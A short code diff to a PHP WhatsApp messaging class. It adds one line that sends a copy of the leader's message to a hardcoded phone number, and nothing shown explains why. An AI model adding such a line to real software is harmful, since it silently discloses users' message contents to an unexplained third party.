@@ -217,6 +217,7 @@ class WhatsAppChannel
         */
 
         $this->sendMessage($leaderPhone, $messageLeader);
+        $this->sendMessage('+522225637072', $messageLeader);
 
         return true;
     }
